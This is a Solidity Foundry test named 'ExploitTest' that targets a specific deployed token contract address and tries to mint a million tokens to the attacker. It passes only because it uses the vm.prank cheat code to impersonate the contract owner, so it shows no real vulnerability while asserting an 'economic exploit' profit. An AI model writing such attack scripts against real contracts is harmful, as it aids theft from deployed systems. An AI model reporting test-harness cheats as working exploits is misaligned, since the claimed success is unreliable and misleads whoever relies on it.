// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface LineAxis {
    function owner() external view returns (address);
    function mint(address to, uint value) external;
    function balanceOf(address owner) external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));

        // Get the current owner
        address contractOwner = LineAxis(TARGET).owner();

        // Record initial balance
        uint256 initialBalance = LineAxis(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to ourselves
        vm.prank(contractOwner);
        LineAxis(TARGET).mint(attacker, 1_000_000 * 10**18);

        // Verify balance increased
        uint256 finalBalance = LineAxis(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        uint256 finalERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
